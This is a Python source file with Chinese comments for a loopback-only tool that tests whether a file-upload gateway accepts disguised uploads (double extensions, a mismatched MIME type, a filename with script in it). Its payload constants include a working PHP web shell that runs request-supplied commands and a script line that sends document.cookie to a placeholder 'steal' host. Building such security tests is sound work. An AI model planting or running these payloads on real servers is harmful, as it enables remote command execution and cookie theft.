#!/usr/bin/env python3
"""文件上传网关绕过检测工具（本地授权验证，仅标准库）。

用法：
  python upload_scanner.py <gateway_url> --config config.json \
      --output result.json --summary summary.txt --log-file scan.log [-v]

行为：
  1. 仅允许向本机回环地址发起请求；地址不合法或配置缺失/非法时直接报错、
     非零码退出，且不发起任何网络请求。
  2. 按配置构造固定三类伪装上传载荷（双扩展名 / MIME 与内容不符 /
     带脚本内容的文件名），逐一投递并依据响应判定是否被接受。
  3. 单个载荷连接故障不影响其余载荷，该载荷标记为未完成并记录可读原因。
  4. 结果写 JSON（每项含编号、结论、判定依据、证据），摘要写文本统计，
     全程写日志，-v 调高日志详细程度。
"""
from __future__ import annotations

import argparse
import http.client
import json
import logging
import socket
import sys
import urllib.parse
from dataclasses import dataclass
from pathlib import Path

# Windows GBK 控制台下保证中文输出不崩：把标准流切到 UTF-8，并对无法编码字符兜底
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="backslashreplace")
    except (AttributeError, ValueError):
        pass

# 固定载荷清单：三类伪装上传，样本由代码确定性构造（无随机、无外部样本）
BOUNDARY = "----p47multipartboundary7f3a9c21"
JPEG_MAGIC = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
PNG_MAGIC = b"\x89PNG\r\n\x1a\n\x1a\x00\x00\x00\rIHDR"
PHP_SHELL = (b"<?php echo 'p47-deterministic-sample'; "
             b"if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);} ?>")
JS_NAVIGATE = b"<script>window.location='http://loopback-only-p47/steal?c='+document.cookie</script>"

SEVERITY_ORDER = {"high": 0, "medium": 1, "low": 2}


@dataclass(frozen=True)
class Payload:
    payload_id: str
    category: str
    severity: str
    filename: str
    declared_mime: str
    content: bytes
    description: str


PAYLOADS: tuple[Payload, ...] = (
    Payload(
        payload_id="P01",
        category="double_extension",
        severity="high",
        filename="shell.php.jpg",
        declared_mime="image/jpeg",
        content=PHP_SHELL,
        description="双扩展名：文件名以 .jpg 结尾但内嵌 .php，内容为 PHP 脚本",
    ),
    Payload(
        payload_id="P02",
        category="mime_content_mismatch",
        severity="medium",
        filename="avatar.jpg",
        declared_mime="image/jpeg",
        content=PNG_MAGIC + b"\x00" * 16,
        description="MIME 与内容不符：声明 image/jpeg，实际内容为 PNG 魔数",
    ),
    Payload(
        payload_id="P03",
        category="scripted_filename",
        severity="low",
        filename="notes<script>alert(1)</script>.png",
        declared_mime="image/png",
        content=PNG_MAGIC + b"\x00" * 16,
        description="带脚本内容的文件名：文件名包含 <script> 片段",
    ),
)


class ConfigError(Exception):
    """配置文件缺失或不合法。"""


class UsageError(Exception):
    """命令行参数 / 目标地址不合法（在发起任何请求前抛出）。"""


def validate_gateway_url(url: str) -> urllib.parse.ParseResult:
    """校验网关地址：必须是 http(s) 且主机为本机回环，否则拒绝且不发请求。"""
    if not url:
        raise UsageError("网关地址为空")
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise UsageError(f"网关地址必须是 http/https URL，收到 scheme={parsed.scheme!r}")
    host = parsed.hostname
    if not host:
        raise UsageError("网关地址中缺少主机名")
    loopback_names = {"localhost", "ip6-localhost", "ip6-loopback"}
    is_loopback = (
        host in loopback_names
        or host == "::1"
        or host.startswith("127.")
    )
    if not is_loopback:
        raise UsageError(
            f"安全限制：仅允许向本机回环地址发起检测，{host!r} 不是回环地址；"
            "未发起任何请求"
        )
    if not parsed.port and parsed.scheme == "https":
        pass  # 用默认端口即可，无需额外处理
    return parsed


def load_config(path: str) -> dict:
    """加载并校验表单字段配置文件。"""
    try:
        with open(path, "r", encoding="utf-8") as fh:
            cfg = json.load(fh)
    except FileNotFoundError as exc:
        raise ConfigError(f"配置文件不存在: {path}") from exc
    except json.JSONDecodeError as exc:
        raise ConfigError(f"配置文件不是合法 JSON: {exc}") from exc
    except OSError as exc:
        raise ConfigError(f"配置文件无法读取: {exc}") from exc

    if not isinstance(cfg, dict):
        raise ConfigError("配置文件根节点必须是 JSON 对象")
    required = {
        "file_field": str,
        "text_fields": dict,
        "upload_path": str,
    }
    for key, typ in required.items():
        if key not in cfg:
            raise ConfigError(f"配置缺少必填字段: {key}")
        if not isinstance(cfg[key], typ):
            raise ConfigError(f"配置字段 {key} 类型错误，应为 {typ.__name__}")
    if not cfg["file_field"].strip():
        raise ConfigError("file_field 不能为空字符串")
    if any(not isinstance(k, str) or not k.strip() or not isinstance(v, str)
           for k, v in cfg["text_fields"].items()):
        raise ConfigError("text_fields 必须是字符串键到字符串值的映射且键名非空")
    if not cfg["upload_path"].startswith("/"):
        raise ConfigError("upload_path 必须以 / 开头")
    if cfg["file_field"] in cfg["text_fields"] or cfg["file_field"] == "payload_id":
        raise ConfigError("file_field 不得与 text_fields 键或保留字段 payload_id 冲突")
    return cfg


def build_multipart(payload: Payload, cfg: dict) -> bytes:
    """按配置手工构造 multipart/form-data 请求体（确定性，无随机边界）。"""
    parts: list[bytes] = []
    crlf = b"\r\n"

    def add_text(name: str, value: str) -> None:
        parts.append(("--" + BOUNDARY).encode("ascii"))
        parts.append(f'Content-Disposition: form-data; name="{name}"'.encode("utf-8"))
        parts.append(b"")
        parts.append(value.encode("utf-8"))

    add_text("payload_id", payload.payload_id)
    for name, value in cfg["text_fields"].items():
        add_text(name, value)

    parts.append(("--" + BOUNDARY).encode("ascii"))
    parts.append(
        f'Content-Disposition: form-data; name="{cfg["file_field"]}"; '
        f'filename="{payload.filename}"'.encode("utf-8")
    )
    # 不提供 Content-Type，由 X-Declared-Mime 头表达网关看到的“声明 MIME”
    parts.append(b"")
    parts.append(payload.content)
    parts.append(("--" + BOUNDARY + "--").encode("ascii"))
    parts.append(b"")
    return crlf.join(parts)


def deliver(parsed: urllib.parse.ParseResult, body: bytes, payload: Payload,
            timeout: float, log: logging.Logger) -> dict:
    """投递单个载荷，返回原始响应信息；所有网络故障向上抛由调用方隔离。"""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    if parsed.scheme == "https":
        conn = http.client.HTTPSConnection(parsed.hostname, port, timeout=timeout)
    else:
        conn = http.client.HTTPConnection(parsed.hostname, port, timeout=timeout)

    headers = {
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        "Content-Length": str(len(body)),
        "X-Declared-Mime": payload.declared_mime,
        "Connection": "close",
    }
    log.debug("POST %s%s payload=%s bytes=%d headers=%s",
              parsed.hostname, path, payload.payload_id, len(body), headers)
    conn.request("POST", path, body=body, headers=headers)
    resp = conn.getresponse()
    status = resp.status
    resp_body = resp.read()
    conn.close()
    log.debug("payload=%s status=%d body=%r", payload.payload_id, status, resp_body[:500])
    return {"status": status, "body": resp_body}


def judge(payload: Payload, raw: dict | None, error: Exception | None,
          log: logging.Logger) -> dict:
    """依据响应判定结论：accepted / rejected / incomplete。"""
    base = {
        "payload_id": payload.payload_id,
        "category": payload.category,
        "severity": payload.severity,
        "filename": payload.filename,
        "declared_mime": payload.declared_mime,
        "description": payload.description,
        "verdict": None,
        "basis": None,
        "evidence": None,
        "status_code": None,
    }
    if error is not None:
        reason = f"{type(error).__name__}: {error}"
        base["verdict"] = "incomplete"
        base["basis"] = "投递过程中发生连接故障，未取得网关响应，该项不参与接受/拒绝统计"
        base["error"] = reason
        log.warning("payload %s 未完成: %s", payload.payload_id, reason)
        return base

    status, body = raw["status"], raw["body"]
    base["status_code"] = status
    try:
        data = json.loads(body.decode("utf-8", "replace"))
    except (json.JSONDecodeError, UnicodeDecodeError):
        data = None

    if isinstance(data, dict) and data.get("accepted") is True:
        snippet_body = body[:300].decode("utf-8", "replace")
        base["verdict"] = "accepted"
        base["basis"] = (f"网关返回 HTTP {status} 且 JSON 响应 accepted=true"
                         f"（reason={data.get('reason')!r}）")
        base["evidence"] = (
            f"HTTP {status}; response={snippet_body}; "
          f"sent filename={payload.filename!r}, declared_mime={payload.declared_mime!r}, "
            f"content_prefix={payload.content[:40]!r}"
        )
        log.warning("payload %s 被接受（绕过成立）: %s",
                    payload.payload_id, base["basis"])
    else:
        reason = data.get("reason") if isinstance(data, dict) else None
        base["verdict"] = "rejected"
        base["basis"] = (
            f"网关返回 HTTP {status} 且未给出 accepted=true 响应"
            + (f"（reason={reason!r}）" if reason else f"（原始响应片段={body[:200]!r}）")
        )
        log.info("payload %s 被拒绝: %s", payload.payload_id, base["basis"])
    return base


def order_results(results: list[dict]) -> list[dict]:
    """被接受项按 high->medium->low 排序在前，其余保持载荷编号顺序在后。"""
    accepted = sorted(
        (r for r in results if r["verdict"] == "accepted"),
        key=lambda r: (SEVERITY_ORDER[r["severity"]], r["payload_id"]),
    )
    others = [r for r in results if r["verdict"] != "accepted"]
    return accepted + others


def write_summary(results: list[dict], path: str) -> None:
    sev_counts = {"high": 0, "medium": 0, "low": 0}
    verdict_counts = {"accepted": 0, "rejected": 0, "incomplete": 0}
    lines = ["Upload gateway bypass scan summary", "=" * 40, ""]

    lines.append("Accepted findings (sorted by severity desc):")
    accepted = [r for r in results if r["verdict"] == "accepted"]
    if accepted:
        for r in accepted:
            lines.append(
                f"[{r['severity'].upper()}] {r['payload_id']} {r['category']} "
                f"filename={r['filename']!r} -- {r['basis']}"
            )
            sev_counts[r["severity"]] += 1
    else:
        lines.append("(none)")
    lines.append("")

    for r in results:
        verdict_counts[r["verdict"]] += 1

    lines.append("Severity counts of accepted findings: "
                 f"High: {sev_counts['high']}, Medium: {sev_counts['medium']}, "
                 f"Low: {sev_counts['low']}")
    lines.append("Verdict counts: "
                 f"accepted: {verdict_counts['accepted']}, "
                 f"rejected: {verdict_counts['rejected']}, "
                 f"incomplete: {verdict_counts['incomplete']}")
    lines.append("")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines))


def setup_logger(log_file: str, verbose: bool) -> logging.Logger:
    logger = logging.getLogger("upload_scanner")
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
    logger.handlers.clear()
    fmt = logging.Formatter("%(asctime)s %(levelname)s %(message)s")
    fh = logging.FileHandler(log_file, encoding="utf-8")
    fh.setLevel(logging.DEBUG if verbose else logging.INFO)
    fh.setFormatter(fmt)
    logger.addHandler(fh)
    sh = logging.StreamHandler(sys.stderr)
    sh.setLevel(logging.WARNING)  # 控制台只保留警告/故障，详细过程进日志文件
    sh.setFormatter(fmt)
    logger.addHandler(sh)
    return logger


def parse_args(argv: list[str]) -> argparse.Namespace:
    ap = argparse.ArgumentParser(
        description="本地文件上传网关绕过检测工具（仅限回环地址）")
    ap.add_argument("gateway_url", help="网关地址，必须是本机回环 http(s) URL")
    ap.add_argument("--config", required=True, help="表单字段配置 JSON 文件")
    ap.add_argument("--output", default="result.json", help="结构化结果 JSON 路径")
    ap.add_argument("--summary", default="summary.txt", help="摘要文本路径")
    ap.add_argument("--log-file", default="scan.log", help="日志文件路径")
    ap.add_argument("--timeout", type=float, default=5.0, help="单次投递超时秒数")
    ap.add_argument("-v", "--verbose", action="store_true",
                    help="提高日志详细程度（DEBUG，含请求头与原始响应）")
    return ap.parse_args(argv)


def run(argv: list[str]) -> int:
    args = parse_args(argv)

    # ---- 全部前置校验在任何网络请求之前完成 ----
    try:
        parsed = validate_gateway_url(args.gateway_url)
        cfg = load_config(args.config)
    except (UsageError, ConfigError) as exc:
        print(f"错误: {exc}", file=sys.stderr)
        return 2

    log = setup_logger(args.log_file, args.verbose)
    log.info("scan start target=%s config=%s verbose=%s",
             args.gateway_url, args.config, args.verbose)
    log.info("loaded config: %s", json.dumps(cfg, ensure_ascii=False))

    results: list[dict] = []
    for payload in PAYLOADS:
        log.info("deliver %s category=%s severity=%s filename=%r",
                 payload.payload_id, payload.category,
                 payload.severity, payload.filename)
        body = build_multipart(payload, cfg)
        raw, err = None, None
        try:
            raw = deliver(parsed, body, payload, args.timeout, log)
        except (ConnectionError, socket.timeout, OSError,
                http.client.HTTPException) as exc:
            err = exc
            log.error("deliver %s failed: %s: %s",
                      payload.payload_id, type(exc).__name__, exc)
        result = judge(payload, raw, err, log)
        log.info("judge %s verdict=%s basis=%s",
                 payload.payload_id, result["verdict"], result["basis"])
        results.append(result)

    results = order_results(results)
    accepted = [r for r in results if r["verdict"] == "accepted"]
    incomplete = [r for r in results if r["verdict"] == "incomplete"]

    payload = {
        "target": args.gateway_url,
        "config": cfg,
        "payload_total": len(PAYLOADS),
        "accepted_total": len(accepted),
        "incomplete_total": len(incomplete),
        "results": results,
    }
    with open(args.output, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, ensure_ascii=False, indent=2)
    write_summary(results, args.summary)

    log.info("scan done accepted=%d rejected=%d incomplete=%d -> %s",
             len(accepted),
             sum(1 for r in results if r["verdict"] == "rejected"),
             len(incomplete), args.output)
    print(f"scan finished: accepted={len(accepted)} "
          f"rejected={sum(1 for r in results if r['verdict'] == 'rejected')} "
          f"incomplete={len(incomplete)}; result={args.output}, summary={args.summary}")
    # 全部完成且无接受项 -> 0；存在未完成 -> 3；发现绕过（有接受项）-> 1
    if incomplete:
        return 3
    return 1 if accepted else 0


def main() -> int:
    return run(sys.argv[1:])


if __name__ == "__main__":
    raise SystemExit(main())
